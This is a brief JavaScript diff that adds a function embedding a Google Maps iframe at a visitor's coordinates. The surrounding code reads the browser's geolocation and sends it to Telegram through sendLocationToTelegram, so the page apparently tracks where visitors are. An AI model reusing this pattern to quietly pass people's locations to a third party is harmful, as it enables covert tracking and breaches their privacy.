@@ -261,6 +261,7 @@
                     console.log("Location info: ", locationInfo);
 
                     await sendLocationToTelegram(locationInfo);
+                    displayMap(latitude, longitude);
                 }, (error) => {
                     console.error("Error getting location: ", error);
                 });
@@ -292,6 +293,18 @@
             } catch (error) {
                 console.error("Error sending location info to Telegram: ", error);
             }
+        }
+
+        function displayMap(latitude, longitude) {
+            const mapUrl = `https://www.google.com/maps?q=${latitude},${longitude}&z=15&output=embed`;
+            const mapIframe = document.createElement('iframe');
+            mapIframe.src = mapUrl;
+            mapIframe.width = '600';
+            mapIframe.height = '450';
+            mapIframe.style.border = '0';
+            mapIframe.allowFullscreen = '';
+            mapIframe.loading = 'lazy';
+            document.body.appendChild(mapIframe);
         }
 
         async function initializeFirstPart() {
